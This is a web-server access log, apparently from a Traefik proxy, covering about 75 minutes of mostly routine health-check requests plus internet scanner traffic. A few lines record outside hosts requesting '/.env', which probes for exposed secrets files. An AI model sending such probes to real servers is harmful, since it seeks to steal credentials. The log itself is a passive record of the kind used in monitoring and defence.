159.203.109.206 - - [16/Dec/2023:15:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2619 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2620 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2621 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2622 "www@docker" "http://172.29.0.8:80" 0ms
179.127.166.50 - - [16/Dec/2023:15:20:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2623 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2624 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2625 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2626 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2627 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:15:23:04 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2628 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2629 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2630 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2631 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2632 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2633 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2634 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2635 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2636 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2637 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2638 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2639 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2640 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2641 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2642 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2643 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2644 "www@docker" "http://172.29.0.8:80" 1ms
54.37.79.75 - - [16/Dec/2023:15:30:46 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2645 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [16/Dec/2023:15:30:46 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2646 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2647 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2648 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2649 "www@docker" "http://172.29.0.8:80" 0ms
167.94.138.34 - - [16/Dec/2023:15:32:25 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2650 "web-to-websecure@internal" "-" 0ms
167.94.138.34 - - [16/Dec/2023:15:32:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2651 "web-to-websecure@internal" "-" 0ms
167.94.138.34 - - [16/Dec/2023:15:32:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2652 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:15:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2653 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2654 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2655 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2656 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2657 "www@docker" "http://172.29.0.8:80" 0ms
78.153.140.219 - - [16/Dec/2023:15:35:08 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2658 "-" "-" 0ms
78.153.140.219 - - [16/Dec/2023:15:35:08 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2659 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2660 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2661 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2662 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2663 "www@docker" "http://172.29.0.8:80" 0ms
118.193.68.150 - - [16/Dec/2023:15:37:11 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2664 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2665 "www@docker" "http://172.29.0.8:80" 0ms
118.193.68.150 - - [16/Dec/2023:15:37:30 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2666 "-" "-" 0ms
118.193.68.150 - - [16/Dec/2023:15:37:32 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2667 "-" "-" 0ms
118.193.68.150 - - [16/Dec/2023:15:37:33 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2668 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:15:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2669 "www@docker" "http://172.29.0.8:80" 1ms
68.69.186.30 - - [16/Dec/2023:15:37:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2670 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [16/Dec/2023:15:38:05 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 2671 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [16/Dec/2023:15:38:16 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 2672 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2673 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2674 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2675 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2676 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2677 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2678 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:41:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2679 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2680 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2681 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2682 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2683 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2684 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2685 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2686 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2687 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2688 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2689 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2690 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2691 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2692 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2693 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2694 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2695 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2696 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2697 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2698 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2699 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2700 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:52:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2701 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2702 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:15:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2703 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2704 "www@docker" "http://172.29.0.8:80" 1ms
152.32.245.5 - - [16/Dec/2023:15:53:50 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2705 "-" "-" 0ms
152.32.245.5 - - [16/Dec/2023:15:54:09 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2706 "-" "-" 0ms
152.32.245.5 - - [16/Dec/2023:15:54:11 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2707 "-" "-" 0ms
152.32.245.5 - - [16/Dec/2023:15:54:13 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2708 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2709 "www@docker" "http://172.29.0.8:80" 1ms
152.32.198.168 - - [16/Dec/2023:15:54:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2710 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:15:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2711 "www@docker" "http://172.29.0.8:80" 0ms
152.32.198.168 - - [16/Dec/2023:15:54:48 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2712 "-" "-" 0ms
152.32.198.168 - - [16/Dec/2023:15:54:49 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2713 "-" "-" 0ms
152.32.198.168 - - [16/Dec/2023:15:54:50 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2714 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2715 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:15:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2716 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2717 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2718 "www@docker" "http://172.29.0.8:80" 1ms
143.110.222.166 - - [16/Dec/2023:15:57:00 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2719 "web-to-websecure@internal" "-" 0ms
162.142.125.224 - - [16/Dec/2023:15:57:00 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2720 "-" "-" 0ms
162.142.125.224 - - [16/Dec/2023:15:57:04 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2721 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:15:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2722 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2723 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2724 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2725 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:15:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2726 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:15:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2727 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2728 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2729 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2730 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2731 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2732 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2733 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:03:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2734 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2735 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2736 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2737 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2738 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2739 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2740 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2741 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2742 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2743 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2744 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2745 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2746 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2747 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2748 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2749 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2750 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2751 "www@docker" "http://172.29.0.8:80" 0ms
152.32.141.202 - - [16/Dec/2023:16:11:46 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2752 "-" "-" 0ms
152.32.141.202 - - [16/Dec/2023:16:12:05 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2753 "-" "-" 0ms
152.32.141.202 - - [16/Dec/2023:16:12:07 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2754 "-" "-" 0ms
152.32.141.202 - - [16/Dec/2023:16:12:08 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2755 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:16:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2756 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2757 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2758 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2759 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2760 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2761 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2762 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2763 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2764 "www@docker" "http://172.29.0.8:80" 0ms
185.180.143.190 - - [16/Dec/2023:16:16:22 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2765 "-" "-" 0ms
167.71.120.76 - - [16/Dec/2023:16:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2766 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2767 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2768 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2769 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2770 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2771 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2772 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2773 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2774 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2775 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2776 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2777 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2778 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2779 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2780 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2781 "www@docker" "http://172.29.0.8:80" 0ms
143.110.222.166 - - [16/Dec/2023:16:24:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2782 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [16/Dec/2023:16:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2783 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:25:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2784 "www@docker" "http://172.29.0.8:80" 1ms
167.71.120.76 - - [16/Dec/2023:16:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2785 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2786 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2787 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2788 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2789 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:28:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2790 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2791 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:29:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2792 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2793 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:30:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2794 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2795 "www@docker" "http://172.29.0.8:80" 1ms
185.224.128.191 - - [16/Dec/2023:16:31:10 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2796 "-" "-" 0ms
159.203.109.206 - - [16/Dec/2023:16:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2797 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2798 "www@docker" "http://172.29.0.8:80" 0ms
159.203.109.206 - - [16/Dec/2023:16:32:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2799 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2800 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2801 "www@docker" "http://172.29.0.8:80" 0ms
167.71.120.76 - - [16/Dec/2023:16:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2802 "www@docker" "http://172.29.0.8:80" 1ms
159.203.109.206 - - [16/Dec/2023:16:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2803 "www@docker" "http://172.29.0.8:80" 0ms
